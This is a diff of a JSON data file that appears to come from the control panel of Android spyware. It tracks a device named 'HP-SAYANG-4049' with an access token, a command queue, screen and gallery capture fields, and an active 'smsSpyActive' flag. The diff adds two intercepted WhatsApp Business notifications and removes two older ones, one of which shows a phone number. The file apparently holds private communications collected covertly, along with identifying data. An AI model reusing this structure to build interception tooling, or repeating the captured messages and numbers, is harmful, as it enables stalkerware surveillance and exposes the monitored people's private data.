@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775634077025,
+    "lastSeen": 1775634092037,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎5 pesan dari 2 chat",
+        "time": "08/04 14:41",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775634094626
+      },
+      {
+        "appName": "WA Business",
+        "sender": "‎𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏 (2 pesan): Membalas Anda",
+        "content": "~ 𝖅𝕽𝕴𝕷𝖅 ℌ𝔒𝔖𝔗: @⁨Naxrat⁩ buat apa",
+        "time": "08/04 14:41",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775634094547
+      },
       {
         "appName": "WA Business",
         "sender": "WA Business",
@@ -4310,22 +4326,6 @@
         "time": "08/04 14:24",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775633074341
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 856-2460-4911",
-        "content": "📡 Undangan admin saluran",
-        "time": "08/04 14:24",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633074336
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎22 pesan dari 3 chat",
-        "time": "08/04 14:24",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633072568
       }
     ],
     "galleryPhotos": [],
